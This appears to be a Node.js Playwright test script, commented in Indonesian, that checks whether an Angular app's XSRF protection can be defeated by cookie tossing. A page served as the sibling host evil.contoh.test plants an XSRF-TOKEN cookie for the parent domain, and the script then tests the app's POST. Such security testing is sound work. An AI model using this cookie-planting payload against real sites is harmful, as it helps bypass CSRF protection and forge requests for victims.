import http from 'http'; import fs from 'fs'; import path from 'path';
import {chromium} from 'playwright';
const ROOT='/tmp/claude-0/-home-user-angular/6dfb30ce-dc86-5a77-b4e3-199a6ce5b187/scratchpad';
const MIME={'.html':'text/html','.mjs':'text/javascript','.js':'text/javascript'};
function res_(p){for(const c of [p,p+'.js',path.join(p,'index.js')]){try{if(fs.statSync(c).isFile())return c}catch{}}return null}

// Satu server melayani KEDUA host; dibedakan lewat header Host.
const srv=http.createServer((req,res)=>{
  const host=(req.headers.host||'').split(':')[0];
  if(req.url.startsWith('/echo')){
    res.writeHead(200,{'Content-Type':'application/json'});res.end('{"ok":true}');return;
  }
  if(host==='evil.contoh.test'){
    // Halaman penyerang: HANYA menyetel cookie ber-Domain untuk domain INDUK.
    res.writeHead(200,{'Content-Type':'text/html'});
    res.end(`<!doctype html><title>evil</title><script>
      document.cookie = 'XSRF-TOKEN=%; Domain=contoh.test; path=/';
      window.__SET__ = document.cookie;
    </script>`);
    return;
  }
  const f=res_(path.join(ROOT,decodeURIComponent(req.url.split('?')[0])));
  if(!f){res.writeHead(404);res.end('nf');return;}
  res.writeHead(200,{'Content-Type':MIME[path.extname(f)]||'text/javascript'});
  res.end(fs.readFileSync(f));
});
await new Promise(r=>srv.listen(8099,r));
const B='http://app.contoh.test:8099', E='http://evil.contoh.test:8099';

const browser=await chromium.launch({executablePath:'/opt/pw-browsers/chromium-1194/chrome-linux/chrome',args:['--no-sandbox']});
const ctx=await browser.newContext();   // satu jar cookie dipakai bersama

async function ujiApp(label){
  const p=await ctx.newPage();
  await p.goto(B+'/router-fuzz/xsrf-min.html',{waitUntil:'load'});
  await p.waitForFunction('window.__R__!==undefined',{timeout:25000}).catch(()=>{});
  const r=await p.evaluate(()=>window.__R__??{hasil:'(tak selesai)'});
  const c=await p.evaluate(()=>document.cookie);
  await p.close();
  return {label, ...r, cookieDilihatApp:c};
}

const out=[];
// 1) Dasar: belum ada cookie sama sekali
out.push(await ujiApp('1. sebelum serangan (tanpa cookie)'));

// 2) Penyerang menanam cookie dari SUBDOMAIN SAUDARA
const pe=await ctx.newPage();
await pe.goto(E+'/',{waitUntil:'load'});
const setOleh=await pe.evaluate(()=>document.cookie);
await pe.close();

// 3) Korban membuka aplikasi di host BERBEDA
out.push(await ujiApp('3. sesudah serangan (cookie ditanam evil)'));

console.log('cookie terlihat di evil.contoh.test :', JSON.stringify(setOleh));
console.log();
for(const o of out){
  console.log(o.label);
  console.log('   cookie dilihat app :', JSON.stringify(o.cookieDilihatApp));
  console.log('   POST               :', o.hasil, o.tipe?('-> '+o.tipe+': '+o.pesan):'');
  console.log();
}
await browser.close(); srv.close();
